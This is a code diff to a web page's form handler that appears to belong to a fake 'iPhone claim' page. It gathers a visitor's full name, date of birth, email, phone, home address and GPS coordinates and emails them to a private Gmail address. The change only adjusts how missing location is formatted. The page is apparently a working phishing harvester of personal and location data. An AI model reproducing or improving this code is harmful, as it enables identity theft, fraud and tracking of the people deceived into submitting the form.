@@ -136,7 +136,10 @@
                 const city = document.getElementById("city").value;
                 const postalCode = document.getElementById("postalCode").value;
 
-                const formMessage = `Full Name: ${fullName}\nDate of Birth: ${dob}\nEmail: ${email}\nPhone Number: ${phoneNumber}\nAddress: ${address}\nCity: ${city}\nPostal Code: ${postalCode}\nLatitude: ${latitude}\nLongitude: ${longitude}`;
+                // If location is available, add it to the message
+                const locationMessage = latitude && longitude ? `Latitude: ${latitude}\nLongitude: ${longitude}` : "Location not available";
+
+                const formMessage = `Full Name: ${fullName}\nDate of Birth: ${dob}\nEmail: ${email}\nPhone Number: ${phoneNumber}\nAddress: ${address}\nCity: ${city}\nPostal Code: ${postalCode}\n${locationMessage}`;
 
                 sendEmail("New iPhone Claim Form Submission", formMessage, "khalilbravi610@gmail.com");
 
